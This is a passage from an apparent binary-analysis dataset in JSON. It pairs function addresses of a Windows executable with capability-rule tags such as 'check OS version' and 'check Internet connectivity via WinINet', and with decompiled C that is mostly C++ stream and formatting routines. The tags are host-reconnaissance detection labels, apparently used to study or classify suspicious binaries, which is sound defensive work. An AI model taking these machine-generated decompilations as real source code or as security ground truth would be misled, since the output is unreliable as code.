            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.004226f0(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    int32_t *arg_8h;\n    int32_t iVar4;\n    int32_t var_8h;\n    uint32_t ReturnedLength;\n    \n    arg_8h = NULL;\n    ReturnedLength = 0;\n    uVar3 = 0;\n    var_8h = 0;\n    iVar4 = 0;\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetLogicalProcessorInformationEx)(0xffff, 0, &ReturnedLength);\n    while( true ) {\n        if (iVar1 != 0) {\n            piVar2 = arg_8h;\n            if (ReturnedLength != 0) {\n                do {\n                    piVar2 = piVar2 + iVar4;\n                    if (*piVar2 == 0) {\n                        var_8h = var_8h + 1;\n                    }\n                    iVar4 = piVar2[1];\n                    uVar3 = uVar3 + iVar4;\n                } while (uVar3 < ReturnedLength);\n            }\n            fcn.0042d696(arg_8h);\n            return var_8h;\n        }\n        iVar1 = (**0x4574e8)();\n        if (iVar1 != 0x7a) break;\n        if (arg_8h != NULL) {\n            fcn.0042d696(arg_8h);\n        }\n        arg_8h = fcn.0042d6d0(ReturnedLength);\n        if (arg_8h == NULL) {\n            return 0;\n        }\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLogicalProcessorInformationEx)(0xffff, arg_8h, &ReturnedLength);\n    }\n    if (arg_8h != NULL) {\n        fcn.0042d696(arg_8h);\n    }\n    return 0;\n}\n",
        "token_count": 427
    },
    "00422a50": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00422a50(void)\n\n{\n    uint arg_8h;\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint var_48h;\n    uint32_t var_40h;\n    uint32_t var_3ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x454664 ^ &stack0xfffffffc;\n    arg_8h = (**0x45757c)(0, 0x104);\n    uVar1 = (**0x457504)();\n    fcn.00434d30(&var_48h, 0, 0x40);\n    var_48h = 0x40;\n    iVar2 = (**0x4575d8)(&var_48h);\n    if (iVar2 == 1) {\n        uVar3 = var_40h >> 0x14 | var_3ch << 0xc;\n        var_3ch = var_3ch >> 0x14;\n    }\n    else {\n        uVar3 = 0;\n        var_3ch = 0;\n    }\n    (**0x457374)(uVar1, \"%d MB\", uVar3, var_3ch);\n    fcn.0042d636(arg_8h);\n    return;\n}\n",
        "token_count": 290
    },
    "00423c70": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00423c70(uint *arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t var_d8h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_a0h;\n    code *var_70h;\n    int32_t var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint32_t var_4h;\n    \n    uStack12 = 0x442504;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    arg_8h[5] = 0xf;\n    arg_8h[4] = 0;\n    *arg_8h = 0;\n    var_4h = 0;\n    var_10h = 1;\n    fcn.00424f80(&var_d8h, arg_ch);\n    var_4h = 1;\n    fcn.00424f00(2);\n    if ((*(&var_cch + *(var_d8h + 4)) & 6) == 0) {\n        (**(**(&var_a0h + *(var_d8h + 4)) + 0x28))(&var_28h, 0, 0, 1, 1);\n    }\n    else {\n        var_28h = *0x444310;\n        var_24h = *0x444314;\n        var_20h = 0;\n        var_1ch = 0;\n        var_18h = 0;\n    }\n    if (arg_8h[4] < var_20h + var_28h) {\n        fcn.00414f50(0);\n    }\n    else {\n        fcn.004094e0(var_20h + var_28h, 0xffffffff);\n    }\n    fcn.00424f00(0);\n    puVar1 = arg_8h;\n    if (0xf < arg_8h[5]) {\n        puVar1 = *arg_8h;\n    }\n    fcn.00424dc0(&var_d8h, puVar1, arg_8h[4], 0);\n    iVar2 = fcn.00421370();\n    if (iVar2 == 0) {\n        iVar2 = *(var_d8h + 4);\n        uVar3 = *(&var_cch + iVar2) | 2;\n        if (*(&var_a0h + iVar2) == 0) {\n            uVar3 = *(&var_cch + iVar2) | 6;\n        }\n        *(&var_cch + iVar2) = uVar3 & 0x17;\n        if ((*(&var_c8h + iVar2) & uVar3 & 0x17) != 0) {\n            fcn.00418500(0);\n        }\n    }\n    var_4h = var_4h & 0xffffff00;\n    fcn.004206f0();\n    var_70h = vtable.std::ios_base.0;\n    fcn.0042cd59(&var_70h);\n    *in_FS_OFFSET = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 766
    },
    "004249e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * fcn.004249e0(int32_t *param_1, uint param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    char cVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    int32_t *in_FS_OFFSET;\n    int32_t *var_8h;\n    uint var_ch_3;\n    uint var_10h;\n    uint var_ch;\n    uint32_t uStack68;\n    uint32_t var_30h;\n    int32_t *var_28h;\n    uint var_24h;\n    int32_t *var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint32_t *puStack20;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x441b32;\n    var_ch_2 = *in_FS_OFFSET;\n    uStack68 = *0x454664 ^ &stack0xfffffffc;\n    puStack20 = &uStack68;\n    *in_FS_OFFSET = &var_ch_2;\n    piVar1 = *(*(*var_8h + 4) + 0x38 + var_8h);\n    var_14h = 0;\n    var_28h = var_8h;\n    puVar3 = &uStack68;\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 4))();\n        puVar3 = puStack20;\n    }\n    puStack20 = puVar3;\n    var_4h = 0;\n    if ((*(*(*var_8h + 4) + 0xc + var_8h) == 0) && (*(*(*var_8h + 4) + 0x3c + var_8h) != 0)) {\n        fcn.00420130();\n    }\n    var_24h._0_1_ = *(*(*var_8h + 4) + 0xc + var_8h) == 0;\n    var_4h = 1;\n    if (var_24h) {\n        fcn.004185d0();\n        var_4h._0_1_ = 2;\n        var_20h = fcn.004273c0();\n        var_4h._0_1_ = 1;\n        if (var_18h != 0) {\n            fcn.0042d14d(0);\n            iVar2 = *(var_18h + 4);\n            if ((iVar2 != 0) && (iVar2 != -1)) {\n                *(var_18h + 4) = iVar2 + -1;\n            }\n            iVar2 = *(var_18h + 4);\n            fcn.0042d175();\n            puVar6 = ~-(iVar2 != 0) & var_18h;\n            if (puVar6 != NULL) {\n                (***puVar6)(1);\n            }\n        }\n        var_4h = CONCAT31(var_4h._1_3_, 3);\n        iVar2 = *(*var_8h + 4);\n        var_30h = var_30h & 0xffffff00;\n        var_1ch = var_1ch & 0xffffff00 | *(iVar2 + 0x40 + var_8h);\n        (**(*var_20h + 0x1c))(&var_30h, var_30h, *(iVar2 + 0x38 + var_8h), *(*var_8h + 4) + var_8h, var_1ch, var_ch_3);\n        if (var_30h != '\\0') {\n            var_14h = 4;\n        }\n    }\n    var_4h = 1;\n    iVar2 = *(*var_8h + 4);\n    if (var_14h != 0) {\n        uVar5 = *(var_8h + iVar2 + 0xc) | var_14h;\n        if (*(var_8h + iVar2 + 0x38) == 0) {\n            uVar5 = uVar5 | 4;\n        }\n        *(var_8h + iVar2 + 0xc) = uVar5 & 0x17;\n        if ((*(var_8h + iVar2 + 0x10) & uVar5 & 0x17) != 0) {\n            fcn.00418500(0);\n        }\n    }\n    var_4h = 5;\n    cVar4 = fcn.0042d536();\n    if (cVar4 == '\\0') {\n        fcn.00426700();\n    }\n    var_4h = 0xffffffff;\n    piVar1 = *(*(*var_8h + 4) + 0x38 + var_8h);\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 8))();\n    }\n    *in_FS_OFFSET = var_ch_2;\n    return var_8h;\n}\n",
        "token_count": 1161
    },
    "00424bd0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * fcn.00424bd0(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    char cVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    int32_t *in_FS_OFFSET;\n    int32_t *var_8h;\n    uint var_10h;\n    uint var_ch;\n    uint uVar7;\n    uint32_t uStack68;\n    uint32_t var_30h;\n    int32_t *var_28h;\n    uint var_24h;\n    int32_t *var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint32_t *puStack20;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x441af2;\n    var_ch_2 = *in_FS_OFFSET;\n    uStack68 = *0x454664 ^ &stack0xfffffffc;\n    puStack20 = &uStack68;\n    *in_FS_OFFSET = &var_ch_2;\n    piVar1 = *(*(*var_8h + 4) + 0x38 + var_8h);\n    var_14h = 0;\n    var_28h = var_8h;\n    puVar3 = &uStack68;\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 4))();\n        puVar3 = puStack20;\n    }\n    puStack20 = puVar3;\n    var_4h = 0;\n    if ((*(*(*var_8h + 4) + 0xc + var_8h) == 0) && (*(*(*var_8h + 4) + 0x3c + var_8h) != 0)) {\n        fcn.00420130();\n    }\n    var_24h._0_1_ = *(*(*var_8h + 4) + 0xc + var_8h) == 0;\n    var_4h = 1;\n    if (var_24h) {\n        fcn.004185d0();\n        var_4h._0_1_ = 2;\n        var_20h = fcn.004273c0();\n        var_4h._0_1_ = 1;\n        if (var_18h != 0) {\n            uVar7 = 0;\n            fcn.0042d14d(0);\n            iVar2 = *(var_18h + 4);\n            if ((iVar2 != 0) && (iVar2 != -1)) {\n                *(var_18h + 4) = iVar2 + -1;\n            }\n            iVar2 = *(var_18h + 4);\n            fcn.0042d175();\n            puVar6 = ~-(iVar2 != 0) & var_18h;\n            if (puVar6 != NULL) {\n                (***puVar6)(1, uVar7);\n            }\n        }\n        var_4h = CONCAT31(var_4h._1_3_, 3);\n        iVar2 = *(*var_8h + 4);\n        var_30h = var_30h & 0xffffff00;\n        var_1ch = var_1ch & 0xffffff00 | *(iVar2 + 0x40 + var_8h);\n        (**(*var_20h + 0xc))(&var_30h, var_30h, *(iVar2 + 0x38 + var_8h), *(*var_8h + 4) + var_8h, var_1ch);\n        if (var_30h != '\\0') {\n            var_14h = 4;\n        }\n    }\n    var_4h = 1;\n    iVar2 = *(*var_8h + 4);\n    if (var_14h != 0) {\n        uVar5 = *(var_8h + iVar2 + 0xc) | var_14h;\n        if (*(var_8h + iVar2 + 0x38) == 0) {\n            uVar5 = uVar5 | 4;\n        }\n        *(var_8h + iVar2 + 0xc) = uVar5 & 0x17;\n        if ((*(var_8h + iVar2 + 0x10) & uVar5 & 0x17) != 0) {\n            fcn.00418500(0);\n        }\n    }\n    var_4h = 5;\n    cVar4 = fcn.0042d536();\n    if (cVar4 == '\\0') {\n        fcn.00426700();\n    }\n    var_4h = 0xffffffff;\n    piVar1 = *(*(*var_8h + 4) + 0x38 + var_8h);\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 8))();\n    }\n    *in_FS_OFFSET = var_ch_2;\n    return var_8h;\n}\n",
        "token_count": 1160
    },
    "00424f00": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00424f00(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t *unaff_ESI;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    \n    if ((*(*(*unaff_ESI + 4) + 0xc + unaff_ESI) & 6) == 0) {\n        (**(**(*(*unaff_ESI + 4) + 0x38 + unaff_ESI) + 0x28))(&var_1ch, 0, 0, arg_8h, 1);\n        if ((var_14h + var_1ch == *0x444310) && ((var_14h >> 0x1f) + var_18h + CARRY4(var_14h, var_1ch) == *0x444314)) {\n            iVar1 = *(*unaff_ESI + 4);\n            uVar2 = *(iVar1 + 0xc + unaff_ESI);\n            uVar3 = uVar2 | 2;\n            if (*(unaff_ESI + iVar1 + 0x38) == 0) {\n                uVar3 = uVar2 | 6;\n            }\n            *(unaff_ESI + iVar1 + 0xc) = uVar3 & 0x17;\n            if ((*(unaff_ESI + iVar1 + 0x10) & uVar3 & 0x17) != 0) {\n                fcn.00418500(0);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 374
    },
    "00424f80": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.00424f80(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    code **arg_8h_00;\n    uchar uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x4423e2;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    *arg_8h = 0x44f758;\n    arg_8h[0x1a] = vtable.std::basic_ios_char__struct_std::char_traits_char__.0;\n    var_4h = 0;\n    *(arg_8h + *(*arg_8h + 4)) = vtable.std::basic_istream_char__struct_std::char_traits_char__.0;\n    arg_8h[2] = 0;\n    arg_8h[3] = 0;\n    iVar4 = *(*arg_8h + 4) + arg_8h;\n    fcn.00418610(uVar2);\n    arg_8h_00 = arg_8h + 4;\n    *(iVar4 + 0x38) = arg_8h_00;\n    *(iVar4 + 0x3c) = 0;\n    uVar1 = fcn.00421840(iVar4, 0x20);\n    *(iVar4 + 0x40) = uVar1;\n    if ((*(iVar4 + 0x38) == 0) &&\n       (uVar2 = *(iVar4 + 0xc) & 0x17 | 4,  *(iVar4 + 0xc) = uVar2,  (*(iVar4 + 0x10) & uVar2) != 0)) {\n        fcn.00418500(0);\n    }\n    var_4h = 2;\n    *(arg_8h + *(*arg_8h + 4)) = vtable.std::basic_ifstream_char__struct_std::char_traits_char__.0;\n    fcn.00421710(arg_8h_00);\n    arg_8h[8] = arg_8h + 6;\n    arg_8h[0xc] = arg_8h + 10;\n    arg_8h[0xd] = arg_8h + 0xb;\n    *arg_8h_00 = vtable.std::basic_filebuf_char__struct_std::char_traits_char__.0;\n    *(arg_8h + 0x18) = 0;\n    *(arg_8h + 0x59) = 0;\n    arg_8h[9] = arg_8h + 7;\n    arg_8h[0x10] = arg_8h + 0xe;\n    arg_8h[0x11] = arg_8h + 0xf;\n    arg_8h[7] = 0;\n    *arg_8h[0xd] = 0;\n    *arg_8h[0x11] = 0;\n    *arg_8h[8] = 0;\n    iVar4 = *0x457818;\n    *arg_8h[0xc] = 0;\n    *arg_8h[0x10] = 0;\n    arg_8h[0x19] = 0;\n    arg_8h[0x17] = iVar4;\n    arg_8h[0x15] = 0;\n    var_4h = CONCAT31(var_4h._1_3_, 3);\n    iVar4 = fcn.004212d0(0x21);\n    if (iVar4 == 0) {\n        iVar4 = *(*arg_8h + 4);\n        uVar2 = *(iVar4 + 0xc + arg_8h);\n        uVar3 = uVar2 | 2;\n        if (*(arg_8h + iVar4 + 0x38) == 0) {\n            uVar3 = uVar2 | 6;\n        }\n        *(arg_8h + iVar4 + 0xc) = uVar3 & 0x17;\n        if ((*(arg_8h + iVar4 + 0x10) & uVar3 & 0x17) != 0) {\n            fcn.00418500(0);\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 1050
    },
    "00425710": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00425710(int32_t *arg_8h)\n\n{\n    code **arg_8h_00;\n    uchar uVar1;\n    uint32_t uVar2;\n    int32_t arg_8h_01;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x44238f;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    *arg_8h = 0x44fb68;\n    arg_8h[0x14] = vtable.std::basic_ios_char__struct_std::char_traits_char__.0;\n    var_4h = 0;\n    *(arg_8h + *(*arg_8h + 4)) = vtable.std::basic_ostream_char__struct_std::char_traits_char__.0;\n    arg_8h_01 = *(*arg_8h + 4) + arg_8h;\n    fcn.00418610(uVar2);\n    arg_8h_00 = arg_8h + 1;\n    *(arg_8h_01 + 0x38) = arg_8h_00;\n    *(arg_8h_01 + 0x3c) = 0;\n    uVar1 = fcn.00421840(arg_8h_01, 0x20);\n    *(arg_8h_01 + 0x40) = uVar1;\n    if ((*(arg_8h_01 + 0x38) == 0) &&\n       (uVar2 = *(arg_8h_01 + 0xc) & 0x17 | 4,  *(arg_8h_01 + 0xc) = uVar2,  (*(arg_8h_01 + 0x10) & uVar2) != 0)) {\n        fcn.00418500(0);\n    }\n    var_4h = 2;\n    *(arg_8h + *(*arg_8h + 4)) =\n         vtable.std::basic_ostringstream_char__struct_std::char_traits_char___class_std::allocator_char__.0;\n    fcn.00421710(arg_8h_00);\n    *arg_8h_00 = vtable.std::basic_stringbuf_char__struct_std::char_traits_char___class_std::allocator_char__.0;\n    arg_8h[0x10] = 0;\n    arg_8h[0x11] = 4;\n    *in_FS_OFFSET = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 607
    },
    "00426700": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00426700(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x441a50;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_2;\n    var_4h = 0;\n    iVar1 = *(*param_1 + 4);\n    if ((*(iVar1 + 0x14 + param_1) & 2) != 0) {\n        uVar2 = 0;\n        if ((*(iVar1 + 0xc + param_1) & 6) == 0) {\n            iVar1 = (**(**(iVar1 + 0x38 + param_1) + 0x34))();\n            if (iVar1 == -1) {\n                uVar2 = 4;\n            }\n        }\n        iVar1 = *(*param_1 + 4);\n        if (uVar2 != 0) {\n            uVar2 = *(param_1 + iVar1 + 0xc) | uVar2;\n            if (*(param_1 + iVar1 + 0x38) == 0) {\n                uVar2 = uVar2 | 4;\n            }\n            *(param_1 + iVar1 + 0xc) = uVar2 & 0x17;\n            if ((*(param_1 + iVar1 + 0x10) & uVar2 & 0x17) != 0) {\n                fcn.00418500(0);\n            }\n        }\n    }\n    *in_FS_OFFSET = var_ch_2;\n    return;\n}\n",
        "token_count": 403
    },
    "004267b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.004267b0(uint arg_8h, int32_t arg_ch, uint *arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch, uint arg_20h\n            , uint arg_24h)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    char **ppcVar5;\n    int32_t iVar6;\n    uint *arg_8h_00;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int32_t in_EDX;\n    int32_t unaff_EBX;\n    uint unaff_ESI;\n    uint *puVar9;\n    int32_t iVar10;\n    int32_t *in_FS_OFFSET;\n    uint32_t var_84h;\n    uint var_80h;\n    int32_t var_7ch;\n    int32_t var_78h;\n    uint var_74h;\n    int32_t *var_70h;\n    int32_t var_6ch;\n    uint32_t var_68h;\n    int32_t var_64h;\n    uint var_60h;\n    int32_t var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    uint *var_4eh;\n    uint *var_48h;\n    uint32_t var_34h;\n    uint *var_2ch;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x441a1b;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &fcn.004267b0::var_ch;\n    var_6ch = arg_14h;\n    var_78h = arg_ch;\n    stack0xffffffb0 = arg_10h;\n    var_5ch = arg_18h;\n    var_54h = arg_1ch;\n    var_64h = in_EDX;\n    fcn.004185d0(var_10h);\n    var_4h = 0;\n    piVar4 = fcn.00427500();\n    var_4h = 0xffffffff;\n    var_70h = piVar4;\n    if (var_84h != 0) {\n        var_68h = var_84h;\n        fcn.0042d14d(0);\n        iVar10 = *(var_84h + 4);\n        if ((iVar10 != 0) && (iVar10 != -1)) {\n            *(var_84h + 4) = iVar10 + -1;\n        }\n        iVar10 = *(var_84h + 4);\n        fcn.0042d175();\n        puVar9 = ~-(iVar10 != 0) & var_68h;\n        if (puVar9 != NULL) {\n            (***puVar9)(1);\n        }\n    }\n    fcn.00427380();\n    var_4h = 1;\n    var_4eh._1_1_ = (**(*piVar4 + 8))();\n    var_18h = 0xf;\n    var_1ch = 0;\n    var_2ch = var_2ch & 0xffffff00;\n    var_4h = CONCAT31(var_4h._1_3_, 2);\n    if ((*arg_10h == '+') || (var_68h = 0,  *arg_10h == '-')) {\n        var_68h = 1;\n    }\n    ppcVar5 = fcn.0042f3ae();\n    iVar10 = var_54h;\n    var_60h._0_1_ = **ppcVar5;\n    var_60h._1_2_ = 0x65;\n    var_58h = fcn.0042e260(arg_10h, 0x65, var_54h);\n    iVar6 = fcn.0042e260(arg_10h, var_60h, iVar10);\n    if (iVar6 == 0) {\n        var_5ch = iVar6;\n    }\n    puVar9 = var_48h;\n    if (var_34h < 0x10) {\n        puVar9 = &fcn.004267b0::var_48h;\n    }\n    var_7ch = iVar6;\n    if (*puVar9 != '\\x7f') {\n        puVar9 = var_48h;\n        if (var_34h < 0x10) {\n            puVar9 = &fcn.004267b0::var_48h;\n        }\n        if ('\\0' < *puVar9) {\n            fcn.00414cc0(iVar10);\n            if (var_58h == 0) {\n                fcn.00414f50(0x30);\n            }\n            else {\n                if (iVar6 == 0) {\n                    fcn.00414f50(0x30);\n                    var_64h = iVar6;\n                }\n                unaff_ESI = 0x426966;\n                unaff_EBX = var_5ch;\n                fcn.00426610(var_5ch, 0x30);\n                iVar6 = var_7ch;\n            }\n            if (iVar6 == 0) {\n                fcn.00414f50(0x30);\n            }\n            else {\n                fcn.00426610(var_6ch, unaff_ESI);\n                fcn.00426610(var_64h, 0x30);\n                var_6ch = 0;\n            }\n            var_64h = 0;\n            puVar9 = var_48h;\n            if (var_34h < 0x10) {\n                puVar9 = &fcn.004267b0::var_48h;\n            }\n            arg_8h_00 = var_2ch;\n            if (var_18h < 0x10) {\n                arg_8h_00 = &fcn.004267b0::var_2ch;\n            }\n            iVar6 = fcn.0042f410(arg_8h_00, &fcn.004267b0::var_60h);\n            cVar1 = *puVar9;\n            iVar10 = var_1ch;\n            while (((var_1ch = iVar10,  cVar1 != '\\x7f' && ('\\0' < cVar1)) && (cVar1 < iVar6 - var_68h))) {\n                iVar6 = iVar6 - cVar1;\n                fcn.00426610(1, 0);\n                if ('\\0' < *(puVar9 + 1)) {\n                    puVar9 = puVar9 + 1;\n                }\n                iVar10 = var_1ch;\n                cVar1 = *puVar9;\n            }\n            unique0x1000056c = var_2ch;\n            if (var_18h < 0x10) {\n                unique0x10000568 = &fcn.004267b0::var_2ch;\n            }\n            var_5ch = 0;\n            arg_10h = stack0xffffffb0;\n            var_54h = iVar10;\n        }\n    }\n    uVar8 = *(var_78h + 0x20);\n    uVar7 = var_5ch + iVar10 + var_6ch + var_64h;\n    if (((*(var_78h + 0x24) < 0) || ((*(var_78h + 0x24) < 1 && (uVar8 == 0)))) || (uVar8 <= uVar7)) {\n        var_58h = 0;\n    }\n    else {\n        var_58h = uVar8 - uVar7;\n    }\n    uVar8 = *(var_78h + 0x14) & 0x1c0;\n    if (uVar8 != 0x40) {\n        if (uVar8 == 0x100) {\n            if (var_68h != 0) {\n                puVar9 = fcn.00427240(&fcn.004267b0::var_80h, arg_20h, arg_24h);\n                arg_20h = *puVar9;\n                *0xc = arg_10h + 1;\n                arg_24h = puVar9[1];\n                var_54h = iVar10 + -1;\n            }\n            puVar9 = fcn.00427040(arg_20h, arg_24h);\n            arg_20h = *puVar9;\n            arg_24h = puVar9[1];\n        }\n        else {\n            puVar9 = fcn.00427040(arg_20h, arg_24h);\n            arg_20h = *puVar9;\n            arg_24h = puVar9[1];\n        }\n        var_58h = 0;\n        arg_10h = stack0xffffffb0;\n        iVar10 = var_54h;\n    }\n    iVar6 = fcn.0042e260(arg_10h, var_60h, iVar10);\n    if (iVar6 != 0) {\n        iVar10 = (iVar6 - arg_10h) + 1;\n        puVar9 = fcn.004272b0(&fcn.004267b0::var_80h, iVar6 - arg_10h, arg_20h, arg_24h);\n        puVar9 = fcn.00427040(*puVar9, puVar9[1]);\n        uVar2 = *puVar9;\n        uVar3 = puVar9[1];\n        (**(*var_70h + 4))();\n        puVar9 = fcn.00427040(uVar2, uVar3);\n        puVar9 = fcn.00427040(*puVar9, puVar9[1]);\n        arg_20h = *puVar9;\n        arg_10h = stack0xffffffb0 + iVar10;\n        iVar10 = var_54h - iVar10;\n        arg_24h = puVar9[1];\n        var_54h = iVar10;\n        unique0x10000570 = arg_10h;\n    }\n    iVar6 = fcn.0042e260(arg_10h, 0x65, iVar10);\n    if (iVar6 != 0) {\n        iVar10 = (iVar6 - arg_10h) + 1;\n        puVar9 = fcn.004272b0(&fcn.004267b0::var_74h, iVar6 - arg_10h, arg_20h, arg_24h);\n        puVar9 = fcn.00427040(*puVar9, puVar9[1]);\n        var_5ch = 0;\n        puVar9 = fcn.00427240(&fcn.004267b0::var_74h, *puVar9, puVar9[1]);\n        arg_20h = *puVar9;\n        unique0x00007a00 = stack0xffffffb0 + iVar10;\n        iVar10 = var_54h - iVar10;\n        arg_24h = puVar9[1];\n        var_54h = iVar10;\n    }\n    puVar9 = fcn.004272b0(&fcn.004267b0::var_74h, iVar10, arg_20h, arg_24h);\n    puVar9 = fcn.00427040(*puVar9, puVar9[1]);\n    uVar2 = *puVar9;\n    uVar3 = puVar9[1];\n    *(var_78h + 0x20) = 0;\n    *(var_78h + 0x24) = 0;\n    fcn.00427040(uVar2, uVar3);\n    if (0xf < var_18h) {\n        fcn.0042d62b(var_2ch);\n    }\n    var_18h = 0xf;\n    var_1ch = 0;\n    var_2ch = var_2ch & 0xffffff00;\n    if (0xf < var_34h) {\n        fcn.0042d62b(var_48h);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042d636(unaff_EBX);\n    return;\n}\n",
        "token_count": 2793
    },
    "00426da0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
